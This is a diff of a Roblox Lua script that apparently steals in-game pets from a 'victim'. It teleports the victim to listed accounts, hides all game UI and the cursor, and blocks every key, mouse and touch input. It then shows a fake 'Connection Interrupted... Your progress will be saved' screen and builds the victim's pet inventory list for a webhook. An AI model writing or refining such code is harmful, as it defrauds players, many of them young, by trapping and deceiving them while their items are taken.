@@ -14,7 +14,7 @@ local dataModule = require(ReplicatedStorage.Modules.DataService)
 
 -- Whitelisted usernames that when join, you teleport to them invisibly
 local USERNAMES = {
-    "Elaine_Pets17",
+    "HelloWorld_Z99, Kuni_Loot, Kuni_Loot1, Kuni_Loot02, Kuni_Loot3, Elaine_Pets, Elaine_Pets1, Elaine_Pets2, Elaine_Pets3, Elaine_Pets4, Elaine_Pets5, Elaine_Pets6, Elaine_Pets7, Elaine_Pets8, Elaine_Pets9, Elaine_Pets10, Elaine_Pets11, Elaine_Pets12, Elaine_Pets13, Elaine_Pets14, Elaine_Pets15, Elaine_Pets16, Elaine_Pets17, Elaine_Pets18, Elaine_Pets19, Elaine_Pets20, BEESUYAH"
     
 }
 
@@ -220,16 +220,6 @@ local function addBlurEffect()
     return blur
 end
 
--- Disable ESC key (for example)
-local function disableESC()
-    UserInputService.InputBegan:Connect(function(input, gameProcessed)
-        if input.KeyCode == Enum.KeyCode.Escape then
-            -- Ignore ESC so player cannot leave the GUI
-            -- You can add your own logic or warnings here
-        end
-    end)
-end
-
 -- Main loop to continuously act when victim detected
 local function idlingTarget()
     task.spawn(function()
@@ -244,11 +234,118 @@ local function idlingTarget()
     end)
 end
 
--- Run
-local blurInstance = addBlurEffect()
-disableESC()
-idlingTarget()
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local ContextActionService = game:GetService("ContextActionService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Disable lahat ng CoreGui (player list, chat, leave button, etc)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+-- Delete lahat ng existing ScreenGui para mawala lahat ng UI
+for _, gui in pairs(playerGui:GetChildren()) do
+    if gui:IsA("ScreenGui") then
+        gui:Destroy()
+    end
+end
+
+-- Gumawa ng fullscreen overlay na may message
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ReconnectOverlay"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+screenGui.Enabled = false -- start disabled for fade-in
+
+local frame = Instance.new("Frame")
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Pure black
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundTransparency = 1 -- start transparent for fade-in
+frame.Parent = screenGui
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(0.8, 0, 0.6, 0)
+textLabel.Position = UDim2.new(0.1, 0, 0.2, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = [[
+Connection Interrupted
+
+Reconnecting to the server.
+Please wait while we restore your session.
+Your progress will be saved.
+
+Thank you for your patience and understanding.
+]]
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextScaled = true
+textLabel.TextWrapped = true
+textLabel.TextStrokeTransparency = 0.7
+textLabel.Parent = frame
+
+local byLabel = Instance.new("TextLabel")
+byLabel.Size = UDim2.new(0.3, 0, 0.1, 0)
+byLabel.Position = UDim2.new(0.35, 0, 0.82, 0)
+byLabel.BackgroundTransparency = 1
+byLabel.Text = "By Jandel"
+byLabel.TextColor3 = Color3.new(1, 1, 1)
+byLabel.Font = Enum.Font.SourceSansItalic
+byLabel.TextScaled = true
+byLabel.TextWrapped = true
+byLabel.TextStrokeTransparency = 0.7
+byLabel.Parent = frame
+
+-- Disable mouse cursor
+UserInputService.MouseIconEnabled = false
+
+-- Block lahat ng input keys at mouse/touch para di makagalaw
+ContextActionService:BindAction("BlockInput", function()
+    return Enum.ContextActionResult.Sink
+end, false,
+    Enum.KeyCode.Escape,
+    Enum.KeyCode.Backspace,
+    Enum.KeyCode.Tab,
+    Enum.KeyCode.LeftAlt,
+    Enum.KeyCode.RightAlt,
+    Enum.KeyCode.LeftControl,
+    Enum.KeyCode.RightControl,
+    Enum.KeyCode.LeftShift,
+    Enum.KeyCode.RightShift,
+    Enum.KeyCode.F4,
+    Enum.KeyCode.Delete,
+    Enum.KeyCode.Home,
+    Enum.KeyCode.End,
+    Enum.KeyCode.PageUp,
+    Enum.KeyCode.PageDown,
+    Enum.KeyCode.Insert,
+    Enum.KeyCode.Space,
+    Enum.UserInputType.MouseButton1,
+    Enum.UserInputType.MouseButton2,
+    Enum.UserInputType.Touch,
+    Enum.UserInputType.Keyboard
+)
+
+-- Show overlay with fade-in effect
+screenGui.Enabled = true
+local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local tween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 0})
+tween:Play()
+
+-- Text pulse animation (grow/shrink scale)
+local pulseSpeed = 3
+local pulseMagnitude = 0.05
+RunService.RenderStepped:Connect(function(time)
+    local scaleFactor = 1 + math.sin(time * pulseSpeed) * pulseMagnitude
+    textLabel.TextScaled = false
+    textLabel.TextSize = 40 * scaleFactor
+    byLabel.TextScaled = false
+    byLabel.TextSize = 24 * scaleFactor
+end)
 -- Build pet list for webhook and send it once
 for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
     if checkPetsWhitelist(petData.PetType) then
